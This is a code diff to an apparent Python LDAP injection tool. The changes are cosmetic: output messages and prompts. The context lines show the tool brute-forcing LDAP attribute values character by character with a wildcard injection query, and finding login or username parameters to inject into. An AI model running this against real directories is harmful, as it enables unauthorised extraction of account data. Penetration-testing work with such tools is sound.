@@ -31,6 +31,7 @@ def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
     finish = False
     while not finish:
       for char in alphabet: #In each possition test each possible printable char
+        sys.stdout.write(f"\r{attribute}: {value}{char}")
         query = "*)({}={}{}*".format(attribute, value, char)
 
         # if base64 encoded:
@@ -55,8 +56,6 @@ def enum(args, url_str, header_json, data_json, proxy, method, form="json"):
           print("[-] Error: method {} not implemented. Try with GET or POST.".format(method))
           exit(-1)
 
-        sys.stdout.write(f"\r{attribute}: {value}{char}")
-
         #sleep(0.5) #Avoid brute-force bans
 
         if "Cannot login" in r.text and not ("not valid" in r.text or "Malformed" in r.text):
@@ -80,7 +79,7 @@ def extractKeyword(string):
       keyword = re.search("([^\",^']*" + t + "[^\",^']*)", string).group(1)
       #print("    -> {}".format(keyword))
       if keyword != "":
-        user = input("[+] Keyword {} found. Continue with this insertion point? [Y/n]: ".format(keyword))
+        user = input("[+] Keyword '{}' found. Continue with this insertion point? [Y/n]: ".format(keyword))
         if user == 'Y' or user == 'y' or user == '':
           break
         else:
@@ -107,25 +106,25 @@ def calculateInsertionPoint(args, url_json, header_json, data_json):
   if args.insertionTag not in url_str and args.insertionTag not in data_str and args.insertionTag not in header_str:
     print("[*] Insertion tag '*' not found in request. Searching for keywords 'login', 'username' and 'user'.")
    
-    print("[*] Searching header for insertion points.") 
+    print("[*] Searching header for possible insertion points.") 
     key = extractKeyword(header_str)
     if key != "":
-      print("[*] Inserting insertion point into header {}".format(key))
+      print("[*] Inserting injection point into header '{}'".format(key))
       header_json[key] = '*'
     else:
-      print("[*] Searching post data for insertion points.")
+      print("[*] Searching post data for possible insertion points.")
       key = extractKeyword(data_str) 
       if key != "":
-        print("[*] Inserting insertion point into data parameter {}".format(key))
+        print("[*] Inserting injection point into data parameter '{}'".format(key))
         data_json[key] = '*'
       else:
-        print("[*] Searching url for insertion points.")
+        print("[*] Searching url for possible insertion points.")
         key = extractKeyword(url_str) 
         if key != "":
-          print("[*] Inserting insertion point into url parameter {}".format(key))
+          print("[*] Inserting injection point into url parameter '{}'".format(key))
           url_json[key] = '*'
         else:
-          print("[*] No insertion points inserted.")
+          print("[*] No injection points inserted.")
           print("[*] Aborting.")
           exit(0)
 
